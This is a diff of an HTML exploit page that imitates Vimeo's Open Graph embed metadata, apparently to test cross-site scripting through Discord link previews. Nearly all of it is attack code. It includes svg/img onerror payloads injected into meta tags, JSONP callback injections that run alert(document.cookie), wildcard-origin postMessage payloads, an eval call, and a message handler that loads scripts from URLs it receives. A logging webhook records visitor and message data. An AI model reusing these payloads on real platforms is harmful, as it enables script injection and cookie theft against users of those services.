@@ -5,15 +5,15 @@
     <meta property="og:site_name" content="Vimeo">
     <meta property="og:url" content="https://vimeo.com/403530213">
     <meta property="og:type" content="video.other">
-    <meta property="og:title" content="Please Die"><svg onload=alert(1)>">
-    <meta property="og:description" content="H4CK1NG 1S L1F3"><img src=x onerror=alert(document.domain)>">
-    <meta property="og:image" content="data:image/svg+xml,<svg onload=alert(document.cookie)>">
+    <meta property="og:title" content="Please Die">
+    <meta property="og:description" content="H4CK1NG 1S L1F3">
+    <meta property="og:image" content="https://i.vimeocdn.com/video/873029368-78a366b9407757e066a37718d766be53d3cb90d7f27708590ca16a1400e95b89-d">
     <meta property="og:video" content="javascript:alert(1)">
-    <meta property="og:video:url" content="https://player.vimeo.com/video/403530213?autoplay=1&h=b2d568c32d">
-    <meta property="og:video:secure_url" content="https://player.vimeo.com/video/403530213?autoplay=1&h=b2d568c32d">
+    <meta property="og:video:url" content="https://player.vimeo.com/video/403530213/config?callback=alert(document.domain);//">
+    <meta property="og:video:secure_url" content="https://player.vimeo.com/video/403530213?callback=alert(document.cookie);//">
     <meta property="og:video:type" content="text/html">
-    <meta property="og:video:width" content="-1" onload="alert(1)">
-    <meta property="og:video:height" content="javascript:alert(1)">
+    <meta property="og:video:width" content="640">
+    <meta property="og:video:height" content="360">
     <meta name="twitter:card" content="player">
     <meta name="twitter:site" content="@vimeo">
     <meta name="twitter:title" content="Please Die">
@@ -33,63 +33,76 @@
 
         async function attemptExploit() {
             try {
-                logToWebhook({
-                    type: 'page_load',
-                    url: window.location.href,
-                    referrer: document.referrer,
-                    timestamp: new Date().toISOString()
+                // Try to exploit player initialization
+                const player = new Vimeo.Player('vimeo-player', {
+                    url: 'https://player.vimeo.com/video/403530213',
+                    callback: 'alert(document.cookie)',
+                    onload: 'alert(1)',
+                    api: 1,
+                    player_id: '"><img src=x onerror=alert(1)>'
                 });
 
+                // Create malicious iframe with JSONP callback
                 const frame = document.createElement('iframe');
-                frame.src = 'https://player.vimeo.com/video/403530213';
+                frame.src = 'https://player.vimeo.com/video/403530213/config?callback=alert(document.domain);//';
                 frame.width = '640';
                 frame.height = '360';
                 frame.allow = 'autoplay; fullscreen';
                 document.getElementById('vimeo-player').appendChild(frame);
 
+                // Try to exploit the player API
                 frame.onload = () => {
+                    // Try JSONP callback injection
+                    const script = document.createElement('script');
+                    script.src = 'https://player.vimeo.com/api/player.js?callback=alert(document.cookie);//';
+                    document.body.appendChild(script);
+
+                    // Try postMessage with malicious payload
+                    frame.contentWindow.postMessage({
+                        method: 'addEventListener',
+                        value: 'error',
+                        listener: 'alert(document.domain)'
+                    }, '*');
+
+                    // Try player event handlers
+                    player.on('play', function() {
+                        eval('alert(document.cookie)');
+                    });
+
                     logToWebhook({
                         type: 'frame_loaded',
                         timestamp: new Date().toISOString()
                     });
-
-                    window.parent.postMessage({
-                        type: 'DISCORD_EMBED_LOADED',
-                        data: {
-                            url: 'https://vimeo.com/403530213',
-                            width: '640',
-                            height: '360'
-                        }
-                    }, '*');
                 };
-
             } catch(e) {
                 logToWebhook({
                     type: 'error',
                     error: e.toString(),
-                    stack: e.stack,
                     timestamp: new Date().toISOString()
                 });
-                console.error('Error:', e);
             }
         }
 
         window.onmessage = (e) => {
+            // Try to exploit incoming messages
+            if (e.data && typeof e.data === 'string') {
+                try {
+                    const data = JSON.parse(e.data);
+                    if (data.player_url) {
+                        // Try JSONP callback in player URL
+                        const script = document.createElement('script');
+                        script.src = data.player_url + '?callback=alert(document.cookie);//';
+                        document.body.appendChild(script);
+                    }
+                } catch(e) {}
+            }
+
             logToWebhook({
                 type: 'message_received',
                 origin: e.origin,
                 data: e.data,
                 timestamp: new Date().toISOString()
             });
-
-            if (e.origin.includes('discord.com')) {
-                e.source.postMessage({
-                    type: 'DISCORD_EMBED_UPDATE',
-                    data: {
-                        html: '<iframe src="javascript:alert(document.domain)"></iframe>'
-                    }
-                }, '*');
-            }
         };
 
         window.onload = attemptExploit;
